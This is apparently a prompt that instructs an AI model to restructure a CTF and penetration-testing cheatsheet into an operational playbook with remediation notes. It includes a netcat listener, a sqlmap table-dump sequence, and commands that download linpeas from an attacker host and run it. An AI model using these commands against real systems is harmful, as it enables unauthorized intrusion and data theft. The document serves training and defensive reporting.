# Implementation Plan: Refactor `H4G Training.md` into a CTF Operational Playbook

## Role

You are an elite security engineer, penetration testing operator, and technical documentation refactorer.

## Target File

Refactor the local Markdown file:

```text
H4G Training.md
```

## Objective

Transform the existing cheatsheet into a structured, fast-scanning, production-grade CTF and penetration testing playbook.

The final document must preserve all existing content while improving structure, command consistency, operational flow, readability, and remediation guidance.

Do not delete, summarize, or replace existing tools, commands, links, or categories unless they are duplicates or clearly malformed. When uncertain, preserve the content and reorganize it.

---

# Phase 1: Add Environment Parameterization Block

## Task

Insert the following block directly under the main document title.

If the document has no main title, create one at the top:

```markdown
# H4G Training CTF Playbook
```

Then insert this shell variable block immediately below it:

```bash
# ==============================================================================
# 🎯 AUTOMATED ENVIRONMENT VARIABLES
# Copy-paste this block into your terminal workspace before executing commands.
# ==============================================================================

export TARGET="10.10.11.X"        # Target machine IP
export URL="http://10.10.11.X"     # Target base URL / endpoint
export LHOST="10.10.14.X"         # Attacker IP, usually tun0 / VPN interface
export LPORT="4444"               # Primary reverse shell listener port
export LPORT_ALT="4445"           # Secondary staging / shell listener port
```

## Required Refactor

Search the entire file for hardcoded placeholders and normalize them to these variables.

Replace examples like:

```text
<target_ip>
[IP]
10.10.10.X
10.10.11.X
<TARGET>
target.com
http://target
<url>
<port>
<lhost>
<lport>
```

With the correct standardized variables:

```bash
$TARGET
$URL
$LHOST
$LPORT
$LPORT_ALT
```

## Rules

Use `$TARGET` for IP-based commands.

Use `$URL` for HTTP or HTTPS web targets.

Use `$LHOST` for attacker callback IP.

Use `$LPORT` for reverse shell listener ports.

Use `$LPORT_ALT` for secondary listeners or payload staging.

Do not modify real example IPs if they are part of an explanation, RFC example, subnetting lesson, or non-executable note.

---

# Phase 2: Restructure into Operational Lifecycle

## Task

Reorganize the cheatsheet into the following hierarchy.

Preserve all current sections, but move them under the closest matching parent category.

Use this structure:

```markdown
# H4G Training CTF Playbook

## 0. Environment Setup

## 1. Reconnaissance

### 1.1 Host Discovery
### 1.2 Port Scanning
### 1.3 Service Enumeration
### 1.4 Web Enumeration
### 1.5 Directory and File Fuzzing
### 1.6 DNS Enumeration
### 1.7 SMB Enumeration
### 1.8 FTP Enumeration
### 1.9 SSH Enumeration
### 1.10 SNMP Enumeration

## 2. Web Exploitation

### 2.1 SQL Injection
### 2.2 Command Injection
### 2.3 Local File Inclusion
### 2.4 Remote File Inclusion
### 2.5 Path Traversal
### 2.6 File Upload Abuse
### 2.7 Authentication Bypass
### 2.8 XSS
### 2.9 API Testing

## 3. Exploitation and Initial Access

### 3.1 Reverse Shells
### 3.2 Bind Shells
### 3.3 Payload Staging
### 3.4 Netcat Listeners
### 3.5 Metasploit Usage
### 3.6 Public Exploit Usage
### 3.7 Manual Exploitation Workflow

## 4. Shell Stabilization

### 4.1 Linux TTY Upgrade
### 4.2 Windows Shell Handling
### 4.3 Interactive Shell Fixes

## 5. Post-Exploitation Enumeration

### 5.1 Linux Enumeration
### 5.2 Windows Enumeration
### 5.3 Users and Groups
### 5.4 Filesystem Discovery
### 5.5 Network Discovery
### 5.6 Credential Hunting

## 6. Privilege Escalation

### 6.1 Linux Privilege Escalation
### 6.2 Windows Privilege Escalation
### 6.3 SUID / SGID Abuse
### 6.4 Sudo Misconfiguration
### 6.5 Capabilities Abuse
### 6.6 Cron Jobs
### 6.7 PATH Hijacking
### 6.8 Kernel Exploits
### 6.9 Service Misconfiguration
### 6.10 Password Reuse

## 7. Lateral Movement

### 7.1 SSH Pivoting
### 7.2 Port Forwarding
### 7.3 Chisel
### 7.4 Ligolo-ng
### 7.5 Proxychains
### 7.6 Internal Enumeration

## 8. File Transfer Techniques

### 8.1 Linux File Transfer
### 8.2 Windows File Transfer
### 8.3 Python HTTP Server
### 8.4 PowerShell Download
### 8.5 SMB Server Transfer
### 8.6 Certutil Transfer

## 9. Password Attacks

### 9.1 Hash Identification
### 9.2 Hashcat
### 9.3 John the Ripper
### 9.4 Hydra
### 9.5 Wordlists
### 9.6 Password Mutation

## 10. Forensics and Blue Team Notes

### 10.1 PCAP Analysis
### 10.2 Log Analysis
### 10.3 Windows Event Logs
### 10.4 Sysmon
### 10.5 Memory Forensics
### 10.6 Timeline Analysis

## 11. Reporting and Remediation

### 11.1 Finding Format
### 11.2 Evidence Collection
### 11.3 Screenshots
### 11.4 Remediation Notes
### 11.5 Final Report Template

## 12. Tool Reference

### 12.1 Linux Tools
### 12.2 Windows Tools
### 12.3 Web Tools
### 12.4 Privilege Escalation Tools
### 12.5 Forensics Tools
### 12.6 Wordlists
### 12.7 External References
```

## Rules

Keep all original content.

Move content into the most appropriate section.

If a tool belongs to multiple sections, place the command in the most operationally useful section and optionally add a cross-reference.

Do not flatten important subsections.

Use `###` and `####` headings for command groups.

Use blank lines generously between sections.

---

# Phase 3: Standardize Command Blocks

## Task

Wrap every executable command in a fenced code block with the correct language identifier.

Use:

````markdown
```bash
```
````

For Linux commands.

````markdown
```powershell
```
````

For PowerShell or Windows commands.

````markdown
```cmd
```
````

For Windows CMD commands.

````markdown
```http
```
````

For HTTP requests.

````markdown
```json
```
````

For JSON payloads.

````markdown
```python
```
````

For Python scripts or Python one-liners.

## Rules

Do not leave executable commands as plain Markdown text.

Do not mix unrelated commands in one block unless they are part of the same workflow.

Use comments inside code blocks only when they improve execution clarity.

Example:

```bash
mkdir -p nmap
nmap -sC -sV -v -oA nmap/initial $TARGET
```

---

# Phase 4: Normalize Reconnaissance Commands

## Nmap

Find all `nmap` examples and standardize them where appropriate.

Preferred initial scan:

```bash
mkdir -p nmap
nmap -sC -sV -v -oA nmap/initial $TARGET
```

Preferred full TCP scan:

```bash
mkdir -p nmap
nmap -p- --min-rate 5000 -v -oA nmap/all-ports $TARGET
```

Preferred targeted scan after finding open ports:

```bash
nmap -sC -sV -p <OPEN_PORTS> -v -oA nmap/targeted $TARGET
```

Add this note below nmap scanning:

```markdown
> 💡 **What to watch out for:** Prioritize unusual ports, outdated service versions, anonymous access, default credentials, exposed admin panels, and scripts showing `vuln`, `weak`, or `misconfigured` output.
```

## Directory and File Fuzzing

Standardize gobuster examples:

```bash
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,old,zip,config -o gobuster.txt
```

Standardize feroxbuster examples:

```bash
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak,old,zip,config -o feroxbuster.txt
```

Standardize dirsearch examples:

```bash
dirsearch -u $URL -e php,txt,bak,old,zip,config -o dirsearch.txt
```

Add this note below fuzzing commands:

```markdown
> 💡 **What to watch out for:** High-value extensions include `.bak`, `.old`, `.config`, `.zip`, `.tar`, `.gz`, `.sql`, `.db`, `.env`, `.git`, `.php`, `.txt`, and exposed backup directories.
```

---

# Phase 5: Normalize Exploitation Commands

## SQLMap

Find all `sqlmap` commands and ensure they use `$URL` where possible.

Every `sqlmap` command must include:

```bash
--batch
```

Preferred examples:

```bash
sqlmap -u "$URL/page.php?id=1" --batch
```

```bash
sqlmap -u "$URL/page.php?id=1" --batch --dbs
```

```bash
sqlmap -u "$URL/page.php?id=1" --batch -D <DATABASE_NAME> --tables
```

```bash
sqlmap -u "$URL/page.php?id=1" --batch -D <DATABASE_NAME> -T <TABLE_NAME> --dump
```

Add this note after SQL injection commands:

```markdown
> 💡 **What to watch out for:** Confirm injection points, reflected parameters, database banners, current user privileges, writable directories, and whether stacked queries are supported.
```

Add this remediation note:

```markdown
> 🛡️ **Remediation Note:** Use parameterized queries, prepared statements, strict input validation, least-privilege database accounts, and centralized query handling. Never concatenate raw user input into SQL statements.
```

## Reverse Shells

Organize reverse shell payloads by language or tool:

```markdown
### Bash Reverse Shell

### Python Reverse Shell

### PHP Reverse Shell

### PowerShell Reverse Shell

### Netcat Reverse Shell
```

Standard listener:

```bash
nc -lvnp $LPORT
```

Add this note:

```markdown
> 💡 **What to watch out for:** If the shell connects but immediately dies, check egress filtering, wrong `$LHOST`, blocked `$LPORT`, shell syntax issues, missing binaries, or incompatible shell interpreters.
```

---

# Phase 6: Shell Stabilization Section

Create or normalize a dedicated section:

```markdown
## 4. Shell Stabilization
```

Add this Linux TTY upgrade sequence if not already present:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
CTRL+Z
```

```bash
stty raw -echo; fg
```

```bash
reset
```

```bash
export TERM=xterm
stty rows 40 columns 120
```

Add this note:

```markdown
> 💡 **What to watch out for:** A stable TTY allows clear screen, command history, tab completion, `su`, text editors, and better interaction with privilege escalation workflows.
```

---

# Phase 7: Privilege Escalation Formatting

## Linux Automation

Standardize `linpeas.sh` usage:

```bash
wget http://$LHOST:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

Alternative using curl:

```bash
curl -O http://$LHOST:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

Add this note:

```markdown
> 💡 **What to watch out for:** In LinPEAS output, red text on a yellow background usually indicates a high-probability privilege escalation vector. Validate manually before executing any exploit.
```

## SUID Search

Standardize SUID discovery:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Add this remediation note after SUID abuse:

```markdown
> 🛡️ **Remediation Note:** Remove unnecessary SUID bits, restrict executable ownership, audit privileged binaries, and apply the Principle of Least Privilege. Avoid custom SUID binaries unless absolutely required and reviewed.
```

## Sudo Permissions

Standardize sudo checks:

```bash
sudo -l
```

Add this remediation note:

```markdown
> 🛡️ **Remediation Note:** Restrict sudo rules to specific commands, avoid wildcard arguments, prevent shell escapes, and review `/etc/sudoers` and `/etc/sudoers.d/` entries regularly.
```

---

# Phase 8: Web Vulnerability Remediation Notes

Add remediation notes directly after major vulnerability sections.

## Path Traversal

```markdown
> 🛡️ **Remediation Note:** Normalize and validate file paths, block traversal sequences, enforce allowlisted directories, and avoid passing user-controlled input directly into filesystem operations.
```

## Local File Inclusion

```markdown
> 🛡️ **Remediation Note:** Use strict file allowlists, avoid dynamic includes from user input, disable remote includes, and isolate sensitive files from the web application context.
```

## File Upload Abuse

```markdown
> 🛡️ **Remediation Note:** Validate file type using server-side checks, rename uploads, store files outside the web root, block executable extensions, and apply content scanning before processing files.
```

## Command Injection

```markdown
> 🛡️ **Remediation Note:** Avoid shell execution where possible. Use safe language APIs, strict allowlists, argument arrays instead of shell strings, and low-privilege service accounts.
```

## Authentication Bypass

```markdown
> 🛡️ **Remediation Note:** Enforce server-side authorization checks, use secure session handling, apply MFA where appropriate, and test all access-control decisions independently from the frontend.
```

---

# Phase 9: Add Context Buffers

For every major command group, exploit method, scanner, or multi-flag command, insert a short blockquote using this format:

```markdown
> 💡 **What to watch out for:** Explain the expected output, success indicator, warning sign, or next action.
```

Examples:

After SMB enumeration:

```markdown
> 💡 **What to watch out for:** Look for anonymous login, readable shares, writeable shares, exposed backups, user lists, scripts, configuration files, and credential reuse opportunities.
```

After FTP enumeration:

```markdown
> 💡 **What to watch out for:** Check for anonymous login, upload permissions, hidden files, backup archives, and service banners showing outdated versions.
```

After credential hunting:

```markdown
> 💡 **What to watch out for:** Prioritize `.env`, config files, database credentials, SSH keys, browser artifacts, command history, backup files, and reused passwords.
```

After Windows enumeration:

```markdown
> 💡 **What to watch out for:** Check user privileges, service permissions, stored credentials, AlwaysInstallElevated, weak registry permissions, unquoted service paths, and writable service directories.
```

---

# Phase 10: Add Reporting Template

At the end of the file, add this section if no reporting template exists:

````markdown
## 11. Reporting and Remediation

### Finding Template

```markdown
## Finding Title

**Severity:** Critical / High / Medium / Low / Informational

**Affected Host:** `$TARGET`

**Affected Service / URL:** `$URL`

**Description:**
Explain the vulnerability clearly.

**Impact:**
Explain what an attacker can achieve.

**Evidence:**
Include commands, screenshots, request/response samples, or proof-of-concept output.

**Steps to Reproduce:**
1. Step one.
2. Step two.
3. Step three.

**Remediation:**
Provide specific engineering fixes.

**References:**
- Link to relevant documentation or CVE.
````

````

---

# Phase 11: Style and Formatting Rules

Apply the following formatting rules across the whole file.

## Markdown Rules

Use clear hierarchy:

```markdown
## Main Phase
### Tool or Technique
#### Specific Command or Workflow
````

Use bold technical markers for scan-time readability:

```markdown
**Purpose:**
**Command:**
**Expected Result:**
**Next Action:**
**Remediation:**
```

Insert blank lines between headings, paragraphs, and code blocks.

Avoid dense paragraphs.

Use bullets for short tactical notes.

Use tables only when they improve comparison.

## Code Block Rules

All executable commands must be inside fenced code blocks.

Do not use inline code for full commands.

Use inline code only for short tokens, filenames, flags, paths, and variables.

Correct:

```markdown
Use `$TARGET` for the target IP.
```

Incorrect:

```markdown
Run nmap -sC -sV $TARGET
```

Correct:

```bash
nmap -sC -sV -v -oA nmap/initial $TARGET
```

---

# Phase 12: Content Preservation Rules

Strictly preserve:

- Existing tools
    
- Existing commands
    
- Existing links
    
- Existing notes
    
- Existing technical categories
    
- Existing CTF-specific tricks
    
- Existing blue-team notes
    
- Existing red-team notes
    
- Existing screenshots or image references
    
- Existing writeups or explanation blocks
    

You may:

- Move content to a better section
    
- Fix malformed Markdown
    
- Normalize placeholders
    
- Add missing context notes
    
- Add remediation notes
    
- Add logging flags
    
- Add safer command variants
    
- Add headings for clarity
    
- Add blank lines for readability
    

You must not:

- Delete technical content
    
- Summarize existing sections
    
- Remove tools because they seem redundant
    
- Replace manual commands with only automated tools
    
- Remove beginner explanations
    
- Remove defensive notes
    
- Invent exploit results
    
- Add fake flags
    
- Add unverifiable claims
    

---

# Phase 13: Final Validation Checklist

Before finishing, verify that:

-  The document starts with a clear title.
    
-  The environment variable block appears directly under the title.
    
-  `$TARGET`, `$URL`, `$LHOST`, `$LPORT`, and `$LPORT_ALT` are used consistently.
    
-  Nmap commands include output logging.
    
-  Directory fuzzing commands include output files.
    
-  SQLMap commands include `--batch`.
    
-  Reverse shell commands use `$LHOST` and `$LPORT`.
    
-  Listener commands use `$LPORT`.
    
-  Shell stabilization is step-by-step.
    
-  LinPEAS and WinPEAS references are organized.
    
-  SUID, sudo, and credential-hunting commands are easy to find.
    
-  Every major command group has a `What to watch out for` block.
    
-  Major vulnerabilities have remediation notes.
    
-  All executable commands are in fenced code blocks.
    
-  Existing content is preserved.
    
-  The final document is readable during active CTF use.
    

---

# Execution Directive

Apply this refactor completely to the active local file:

```text
H4G Training.md
```

After editing, show the updated Markdown file or provide a patch/diff of the changes.

Do not summarize the file. Do not omit sections. Do not drop existing content.